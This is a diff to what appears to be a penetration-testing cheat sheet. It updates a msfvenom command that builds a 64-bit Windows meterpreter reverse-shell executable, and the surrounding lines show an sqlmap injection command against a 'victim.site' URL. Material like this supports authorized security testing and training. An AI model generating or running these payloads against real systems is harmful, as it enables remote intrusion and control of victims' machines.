@@ -798,6 +798,7 @@ echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
 ## Metasploit Slow Search Fix
 ```
 db_rebuild_cache
+msfdb init
 ```
 ## SQLMap
 ```
@@ -805,7 +806,7 @@ sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 ```
 ## Msfvenom
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe > shell.exe
 ```
 ## WGET vbs (copy and paste into shell)
 ```
